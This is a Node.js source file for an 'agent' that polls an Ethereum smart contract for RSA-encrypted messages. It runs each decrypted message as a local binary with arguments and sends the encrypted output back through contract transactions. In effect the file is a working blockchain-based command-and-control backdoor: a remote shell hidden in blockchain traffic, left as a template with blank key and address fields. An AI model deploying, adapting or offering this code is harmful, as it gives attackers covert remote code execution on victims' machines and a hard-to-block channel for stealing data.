const Web3 = require('web3');
const MessagePortalABI = require('./MessagePortalABI.json');
const crypto = require('crypto');
const { execFileSync } = require('child_process');

// Replace these values with your actual values
const CONTRACT_ADDRESS = "";
const PROVIDER_URL = ""; // e.g., "http://localhost:8545" or your network RPC URL
const AGENT_PUBLIC_KEY = ""; // Your Ethereum address in lowercase
const AGENT_PRIVATE_KEY = "";

// Add your RSA public key in PEM format
const RSA_AGENT_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----`;

// Add your RSA private key in PEM format
const RSA_AGENT_PRIVATE_KEY = `-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----`;

function decryptMessage(encryptedBase64) {
    try {
        const buffer = Buffer.from(encryptedBase64, 'base64');
        const decrypted = crypto.privateDecrypt(
            {
                key: RSA_AGENT_PRIVATE_KEY,
                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: "sha256", // Specify the hash function used for OAEP
            },
            buffer
        );
        return decrypted.toString('utf8');
    } catch (error) {
        console.error('Decryption error:', error);
        return 'Decryption failed';
    }
}

// sending to blockchain
// RSA keys configuration
const SERVER_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----`;

function encryptMessage(message) {
    try {
        const encrypted = crypto.publicEncrypt(
            {
                key: SERVER_PUBLIC_KEY,
                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: "sha256", // Specify the hash function used for OAEP
            },
            Buffer.from(message)
        );
        return encrypted.toString('base64');
    } catch (error) {
        console.error('Encryption error:', error);
        throw error;
    }
}

async function sendMessage(message1, message2, nonce, fragment) {
    try {
        const web3 = new Web3(PROVIDER_URL);
        const contract = new web3.eth.Contract(MessagePortalABI, CONTRACT_ADDRESS);

        // Encrypt messages
        const encryptedMessage1 = encryptMessage(message1);
        const encryptedMessage2 = encryptMessage(message2);

        // Create transaction
        const account = web3.eth.accounts.privateKeyToAccount(AGENT_PRIVATE_KEY);
        web3.eth.accounts.wallet.add(account);
        web3.eth.defaultAccount = account.address;

        // Estimate gas
        const gas = await contract.methods.message(nonce, encryptedMessage1, encryptedMessage2, fragment)
            .estimateGas({ from: account.address });

        // Send transaction
        const result = await contract.methods.message(nonce, encryptedMessage1, encryptedMessage2, fragment)
            .send({
                from: account.address,
                gas: Math.round(gas * 1.5) // Add 50% buffer for safety
            });

        console.log('Message sent successfully!');
        console.log('Transaction hash:', result.transactionHash);
        return result;

    } catch (error) {
        console.error('Error sending message:', error);
        throw error;
    }
}

// helper – works for PEM or DER public keys
function getMaxRsaOaepPayload(keyPem, oaepHash = 'sha256') {
    const keyObj    = crypto.createPublicKey(keyPem);
    const k         = keyObj.asymmetricKeyDetails.modulusLength / 8;        // key-size in bytes
    const hLen      = crypto.createHash(oaepHash).digest().length;          // 32 for sha256
    return k - 2 * hLen - 2;                                                // RFC 8017 §7.1
  }

  function chunkStringUtf8(str, maxBytes) {
    const buf   = Buffer.from(str, 'utf8');
    const out   = [];
    for (let i = 0; i < buf.length; i += maxBytes) {
      out.push(buf.slice(i, i + maxBytes).toString('utf8'));
    }
    return out;
  }

  async function sendLongMessage(message1, longMessage2, nonce) {
    // ❶ work out the safe size once
    const MAX_BYTES = getMaxRsaOaepPayload(SERVER_PUBLIC_KEY, 'sha256');
  
    // ❷ slice message2 so every slice fits RSA-OAEP
    const parts = chunkStringUtf8(longMessage2, MAX_BYTES);
  
    // ❸ send each slice; message1 & nonce stay identical
    var i = 0;
    for (const part of parts) {
      await sendMessage(message1, part, nonce, i);
      i++;
      // optional: delay or log here if you want pacing / progress
    }
  }
// end sending to blockchain

function executeBinarySync(binaryPath, args = []) {
    // Normalize args into an array
    let argArray;
    if (typeof args === 'string') {
      argArray = args
        .match(/(?:[^\s"]+|"[^"]*")+/g)           // split into tokens
        .map(token => token.replace(/^"(.*)"$/, '$1')); // strip wrapping quotes
    } else if (Array.isArray(args)) {
      argArray = args;
    } else {
      throw new TypeError('args must be a string or an array of strings');
    }
  
    try {
      // execFileSync will throw on non-zero exit
      const stdout = execFileSync(binaryPath, argArray, { encoding: 'utf-8' });
      return stdout.trim();
    } catch (err) {
      // err.status is the exit code, err.stderr may contain stderr output
      const message = [
        `Error spawning "${binaryPath}": ${err.message}`,
        err.stderr ? err.stderr.toString() : ''
      ].join('\n');
      throw new Error(message);
    }
  }

async function startListening() {
    // Connect to the network using HTTP provider
    const web3 = new Web3(PROVIDER_URL);  // Changed this line
    const contract = new web3.eth.Contract(MessagePortalABI, CONTRACT_ADDRESS);

    // Get the current timestamp when starting the program
    const startTimestamp = Math.floor(Date.now() / 1000);
    console.log(`Started listening for new messages from timestamp: ${startTimestamp}`);

    // Keep track of processed messages to avoid duplicates
    const processedMessages = new Set();

    while (true) {
        try {
            const messages = await contract.methods.getAllMessages().call();
            
            // Filter and process new messages
            messages.forEach(msg => {
                const messageId = `${msg.nonce}-${msg.messager}-${msg.timestamp}`;
                
                // Only process messages that:
                // 1. Haven't been processed before
                // 2. Occurred after our start timestamp
                // 3. Are not from our own address
                if (!processedMessages.has(messageId) && 
                    Number(msg.timestamp) >= startTimestamp 
                    && msg.messager.toLowerCase() !== AGENT_PUBLIC_KEY.toLowerCase()
                ) {
                    
                    // Decrypt messages
                    const decryptedMsg1 = decryptMessage(msg.message);
                    const decryptedMsg2 = decryptMessage(msg.message2);
                    
                    console.log('\nNew Message Detected:');
                    console.log('------------------------');
                    console.log(`Nonce: ${msg.nonce}`);
                    console.log(`From: ${msg.messager}`);
                    console.log(`Time: ${new Date(Number(msg.timestamp) * 1000).toLocaleString()}`);
                    console.log(`Decrypted Message 1: ${decryptedMsg1}`);
                    console.log(`Decrypted Message 2: ${decryptedMsg2}`);
                    console.log('------------------------');

                    const output = executeBinarySync(decryptedMsg1, decryptedMsg2);
                    console.log(output);

                    sendLongMessage(decryptedMsg1 + " " + decryptedMsg2, output, msg.nonce)

                    // Mark this message as processed
                    processedMessages.add(messageId);
                }
            });

        } catch (error) {
            console.error('Error fetching messages:', error);
        }

        // Wait for 5 seconds before the next fetch
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// Start the listener
startListening().catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
});